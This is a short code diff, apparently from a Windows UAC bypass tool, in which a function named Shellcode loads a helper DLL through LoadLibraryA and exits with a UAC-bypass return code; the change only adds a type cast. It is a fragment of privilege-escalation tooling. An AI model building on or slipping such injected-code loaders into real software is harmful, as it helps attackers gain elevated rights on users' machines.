@@ -167,7 +167,7 @@ BOOL WINAPI Shellcode( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
         if( params->funcLoadLibraryA && params->dllPath[0] )
         {
             // load helper library
-            params->funcLoadLibraryA( params->dllPath );
+            params->funcLoadLibraryA( (LPCTSTR)params->dllPath );
         }        
 		params->funcExitProcess(UAC_BYPASS_MAGIC_RETURN_CODE);
     }
